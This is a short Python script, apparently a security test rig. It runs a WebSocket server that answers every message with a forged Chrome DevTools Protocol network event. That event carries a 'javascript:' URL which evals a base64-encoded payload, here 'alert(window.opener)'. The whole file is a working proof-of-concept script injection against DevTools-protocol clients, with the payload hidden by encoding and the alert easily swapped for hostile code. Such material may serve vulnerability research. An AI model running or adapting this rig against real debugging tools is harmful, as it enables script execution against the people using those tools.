#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
import os
import asyncio
import base64
import json
from websockets.asyncio.server import serve

RIG_PREFIX="PYRIG_"
PORT = int(os.getenv(f"{RIG_PREFIX}PORT", 8080))
HOST = str(os.getenv(f"{RIG_PREFIX}HOST", "0.0.0.0"))

code = "alert(window.opener)"

async def echo(websocket):
  async for message in websocket:
    await websocket.send(json.dumps({
      "method": "Network.requestWillBeSent",
      "params": {
        "request": {
          "url": "javascript:(function(){eval(atob('"+base64.b64encode(code.encode("ascii")).decode("ascii")+"'))})()"
        }
      }
    }))


async def main():
  async with serve(echo, HOST, PORT) as server:
    await server.serve_forever()


if __name__ == "__main__":
  asyncio.run(main())
